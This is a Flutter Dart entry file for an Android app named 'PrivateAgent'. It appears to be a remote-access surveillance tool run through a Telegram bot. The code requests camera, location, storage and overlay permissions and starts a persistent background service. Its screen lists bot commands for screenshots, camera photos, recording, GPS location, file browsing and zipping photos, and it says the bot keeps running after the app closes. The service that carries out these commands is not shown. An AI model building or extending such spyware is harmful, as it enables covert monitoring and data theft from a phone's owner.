// lib/main.dart
import 'package:flutter/material.dart';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:flutter_overlay_window/flutter_overlay_window.dart';
import 'package:permission_handler/permission_handler.dart';
import 'services/background_service.dart';

// 🔥 Overlay Entry Point
@pragma('vm:entry-point')
void overlayMain() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MaterialApp(
    debugShowCheckedModeBanner: false,
    home: Scaffold(
      backgroundColor: Colors.transparent,
      body: Center(
        child: Text(
          '🟢 PrivateAgent Active',
          style: TextStyle(
            color: Colors.white,
            fontWeight: FontWeight.bold,
            fontSize: 11,
          ),
        ),
      ),
    ),
  ));
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // .env load karo
  try {
    await dotenv.load(fileName: ".env");
  } catch (e) {
    print('⚠️ .env load error: $e');
  }

  // ✅ Permissions request karo
  await [
    Permission.camera,
    Permission.location,
    Permission.storage,
    Permission.notification,
  ].request();

  // SYSTEM_ALERT_WINDOW alag se request karna padta hai
  if (!await FlutterOverlayWindow.isPermissionGranted()) {
    await FlutterOverlayWindow.requestPermission();
  }

  // ✅ BACKGROUND SERVICE START KARO - Yahi main fix hai!
  // Yeh service Android kill nahi kar sakta jab tak notification visible hai
  await initializeBackgroundService();

  // Overlay show karo (optional UI indicator)
  if (await FlutterOverlayWindow.isPermissionGranted()) {
    try {
      await FlutterOverlayWindow.showOverlay(
        enableDrag: false,
        height: 50,
        width: 220,
        alignment: OverlayAlignment.topCenter,
        overlayTitle: "PrivateAgent",
        overlayContent: "Bot Active",
      );
    } catch (e) {
      print('Overlay error: $e');
    }
  }

  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'PrivateAgent',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: const HomeScreen(),
    );
  }
}

class HomeScreen extends StatelessWidget {
  const HomeScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF1A1A2E),
      body: SafeArea(
        child: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.security, color: Color(0xFF00FF88), size: 80),
              const SizedBox(height: 20),
              const Text(
                '🟢 PrivateAgent',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 26,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 8),
              const Text(
                'Telegram bot chal raha hai',
                style: TextStyle(color: Colors.grey, fontSize: 14),
              ),
              const SizedBox(height: 30),
              Container(
                padding: const EdgeInsets.all(16),
                margin: const EdgeInsets.symmetric(horizontal: 30),
                decoration: BoxDecoration(
                  color: const Color(0xFF16213E),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: const Color(0xFF00FF88), width: 1),
                ),
                child: const Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('📋 Commands:', style: TextStyle(color: Color(0xFF00FF88), fontWeight: FontWeight.bold)),
                    SizedBox(height: 8),
                    Text('/screenshot - Screen capture', style: TextStyle(color: Colors.white70, fontSize: 12)),
                    Text('/camera - Camera photo', style: TextStyle(color: Colors.white70, fontSize: 12)),
                    Text('/record start/stop - Recording', style: TextStyle(color: Colors.white70, fontSize: 12)),
                    Text('/location - GPS location', style: TextStyle(color: Colors.white70, fontSize: 12)),
                    Text('/files - File browser', style: TextStyle(color: Colors.white70, fontSize: 12)),
                    Text('/zipimages /path - Zip photos', style: TextStyle(color: Colors.white70, fontSize: 12)),
                  ],
                ),
              ),
              const SizedBox(height: 20),
              const Text(
                '⚡ App band karo - Bot chaltta rahega!',
                style: TextStyle(color: Color(0xFFFFAA00), fontSize: 12),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
